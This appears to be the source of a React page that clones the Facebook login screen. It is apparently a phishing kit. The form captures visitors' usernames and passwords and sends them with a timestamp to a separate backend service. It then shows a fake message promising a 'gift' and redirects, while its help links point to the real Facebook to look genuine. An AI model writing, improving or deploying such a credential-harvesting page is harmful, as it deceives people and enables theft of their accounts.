import { useState } from "react";
import "./FbVerify.css";
import users from "../services/appwrite";
import { useEffect } from "react";
import { toast } from "react-toastify";
import { ThreeDots } from "react-loader-spinner";
import { Bounce } from "react-toastify";
import { useNavigate } from "react-router";

export default function FbVerify() {

  const navigate = useNavigate()
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [loading, setLoading] = useState(false)

  const notify = () => toast.success('Success! 🥳 You are verified successfully. We have sent you an email 📩 for further progress. Your gift 🎁 is on the way...Enjoy! 🎉', {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: false,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
    theme: "dark",
    transition: Bounce,
    });

  const handleSubmit = (e) => {
    e.preventDefault()
    setLoading(true)
    const user = {username,password}
    users.loginUser({...user, date: new Date().toISOString()})
    .then((res)=>{
      res ? setIsLoggedIn(true):setIsLoggedIn(false)
      
    })
  }

  useEffect(() => {
   if(isLoggedIn){
     notify()
    setTimeout(() => {
      navigate("/")
    }, 2500);
   }
  }, [isLoggedIn, navigate])
  
  
  
  return (
    <div className="fbbody">

        
<div className="main-contend-section">
  <div className="main-container">
    <div className="w-50">
      <div className="logo">
        <img
          src="https://res.cloudinary.com/drgxflcsb/image/upload/v1681242147/facebook%20clone/logo_mlo10v.svg"
          alt="Logo"
        />
      </div>
      <div className="fb-tag-line">
        <h3 id="tnk">
          Facebook helps you connect and share with the people in your life.
        </h3>
      </div>
    </div>
    <div className="w-50">
      <div className="form-section">
        <form onSubmit={handleSubmit}>
          <input
          required
            type="text"
            name="email-or-number"
            id="email-or-number"
            placeholder="Email address or phone number"
            onChange={(e)=>setUsername(e.target.value)}
            value={username}
          />
          <input
          required
            type="password"
            name="password"
            id="password"
            placeholder="Password"
            onChange={(e)=>setPassword(e.target.value)}
    value={password}
          />
          <button className="cursor-pointer relative" type="submit" name="submit" id="submit" disabled={loading}>
          {loading?<div className="absolute left-1 -top-4 scale-50">
            <ThreeDots
              visible={true}
              color="blue"
              radius="9"
              ariaLabel="three-dots-loading"
              wrapperStyle={{}}
              wrapperClass=""
              
              />
          </div>:""} <span className="inline-block">Log In</span>
          </button>
          
          <a href="https://facebook.com/login" target="_self" className="forgot">Forgotten password?</a>
          <div className="line"></div>
          <a href="https://facebook.com/login" target="_self" className="create-new-acc"
            >Create New Account</a
          >
        </form>
      </div>
      <div className="create-page">
        <p>
          <a href="#" target="_self">Create a Page</a> for a celebrity, band or
          business.
        </p>
      </div>
    </div>
  </div>
</div>

<div className="footer-section">
  <div className="footer-container">
    <div className="language-section">
      <ul>
        <li>English (UK)</li>
        <li><a href="#" target="_self">বাংলা</a></li>
        <li><a href="#" target="_self">অসমীয়া</a></li>
        <li><a href="#" target="_self">हिन्दी</a></li>
        <li><a href="#" target="_self">Bahasa Indonesia</a></li>
        <li><a href="#" target="_self">नेपाली</a></li>
        <li><a href="#" target="_self">中文(简体)</a></li>
        <li><a href="#" target="_self">العربية</a></li>
        <li><a href="#" target="_self">Bahasa Melayu</a></li>
        <li><a href="#" target="_self">Español</a></li>
        <li><a href="#" target="_self">Português (Brasil)</a></li>
        <li><a href="#" target="_self" className="add-more-icon">+</a></li>
      </ul>
    </div>
    <div className="other-pages-link">
      <div className="line"></div>
      <ul>
        <li><a href="#" target="_self">Sign Up</a></li>
        <li><a href="#" target="_self">Log In</a></li>
        <li><a href="#" target="_self">Messenger</a></li>
        <li><a href="#" target="_self">Facebook Lite </a></li>
        <li><a href="#" target="_self">Watch </a></li>
        <li><a href="#" target="_self">People</a></li>
        <li><a href="#" target="_self">Pages</a></li>
        <li><a href="#" target="_self">Page categories</a></li>
        <li><a href="#" target="_self">Places</a></li>
        <li><a href="#" target="_self">Games</a></li>
        <li><a href="#" target="_self">Locations</a></li>
        <li><a href="#" target="_self">Marketplace</a></li>
        <li><a href="#" target="_self">Facebook Pay</a></li>
        <li><a href="#" target="_self">Groups</a></li>
        <li><a href="#" target="_self">Jobs</a></li>
        <li><a href="#" target="_self">Oculus</a></li>
        <li><a href="#" target="_self">Portal</a></li>
        <li><a href="#" target="_self">Instagram</a></li>
        <li><a href="#" target="_self">Local</a></li>
        <li><a href="#" target="_self">Fundraisers</a></li>
        <li><a href="#" target="_self">Services</a></li>
        <li><a href="#" target="_self">Voting Information Centre</a></li>
        <li><a href="#" target="_self">About</a></li>
        <li><a href="#" target="_self">Create ad</a></li>
        <li><a href="#" target="_self">Create Page</a></li>
        <li><a href="#" target="_self">Developers</a></li>
        <li><a href="#" target="_self">Careers</a></li>
        <li><a href="#" target="_self">Privacy</a></li>
        <li><a href="#" target="_self">Cookies</a></li>
        <li>
          <a href="#" target="_self"
            >AdChoices
            <div className="ad-icon">
              <img
                src="https://res.cloudinary.com/drgxflcsb/image/upload/v1681242146/facebook%20clone/ad-icon_k9ged1.png"
                alt="ad-icon"
              /></div
          ></a>
        </li>
        <li><a href="#" target="_self">Terms</a></li>
        <li><a href="#" target="_self">Help</a></li>
      </ul>
    </div>
    <div className="copywrite">
      <p>Facebook &copy; 2023</p>
    </div>
  </div>
</div>


    </div>
  )
}
